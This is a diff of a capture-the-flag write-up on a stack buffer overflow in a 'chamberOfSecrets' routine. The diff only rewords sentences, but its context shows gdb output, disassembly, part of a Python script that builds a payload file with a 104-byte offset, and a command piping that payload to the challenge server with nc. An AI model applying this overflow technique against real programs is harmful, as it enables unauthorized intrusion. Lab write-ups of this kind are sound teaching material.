@@ -179,8 +179,6 @@ Enter the secret:
 Breakpoint 2, 0x00005555555548c7 in chamberOfSecrets ()
 ```
 
-
-
 At this point, the buffer is overflowed and the stack variables are overwritten. These are the stack writing instructions:
 ```
 0x5555555547e5 <chamberOfSecrets+11>    mov    DWORD PTR [rbp-0x8],0x1
@@ -231,7 +229,7 @@ payload += struct.pack('c', b'\n')
 with open('payload.bin', 'wb') as pfile:
     pfile.write(payload)
 ```
-Note that the `offset` value may need to be tweaked a bit (+12) for the decompiled version. Need to investigate further why this is. But the `offset` should be set to 104 for the remote payload. 
+Note that the `offset` value may need to be tweaked a bit (+12) for the decompiled version. Need to investigate why this is. But the `offset` should be set to 104 for the remote payload. 
 
 Run the script. It will create a **payload.bin** file. Send the payload to the decompiled program:
 ```
@@ -242,7 +240,7 @@ Enter the secret: You have passed.
 
 "You have passed". If desired, verify that the variables have the intended values by using gdb as described earlier.
 
-Verify this to the remote host:
+Verify that the payload works on the remote host:
 ```
 $ cat payload.bin | nc challenges.laptophackingcoffee.org 2341
 Enter the secret: You have passed.
